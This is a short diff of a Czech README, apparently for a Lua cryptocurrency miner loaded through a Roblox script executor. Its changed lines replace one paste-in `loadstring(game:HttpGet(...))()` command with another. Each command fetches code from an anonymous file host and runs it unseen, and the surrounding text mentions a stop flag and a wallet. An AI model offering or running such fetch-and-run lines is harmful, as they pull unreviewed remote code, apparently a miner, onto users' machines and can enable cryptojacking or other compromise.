@@ -41,7 +41,7 @@ executor neumi TCP.
 2. Do executoru vlozit `miner/loader.lua`, nebo jen odkaz:
 
    ```lua
-   loadstring(game:HttpGet("https://files.catbox.moe/cdb1t4.lua"))()
+   loadstring(game:HttpGet("https://files.catbox.moe/iyr8u5.lua"))()
    ```
 
 3. Zastavit: `_G.MINER_STOP = true`. Vlastni penizenka:
